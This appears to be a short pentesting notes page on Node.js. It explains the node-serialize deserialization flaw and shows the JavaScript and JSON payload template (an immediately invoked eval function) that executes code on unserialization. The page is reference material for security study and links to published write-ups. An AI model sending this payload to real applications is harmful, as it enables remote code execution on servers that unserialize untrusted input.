# node.js

node is a technology allowing server based apps to be written in Javascript.  Why?  I get why...but why?

In all seriousness it's pretty cool, but requires a different approach than the standard php based web applications that are so common.

## Serialize/Unserialize

With node, and in all honesty any serialization framework, there can be issues if the application accepts untrusted input.  With `node-serialize` we can use the following code to serialize a custom function object.

```js
var y = {
    rce: function(){eval(<function>)}
}

var serialize = require('node-serialize')
console.log("Serialized: \n" + serialize.serialize(y))
```

If we then modify the output to call the resulting object as a function we get:

```json
{"rce":"_$$ND_FUNC$$_function (){eval(<function>)}()"}
```

Once the object is unserialized, the function will be called.

**References  
**[https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)[https://blog.websecurify.com/2017/02/hacking-node-serialize.html](https://blog.websecurify.com/2017/02/hacking-node-serialize.html)

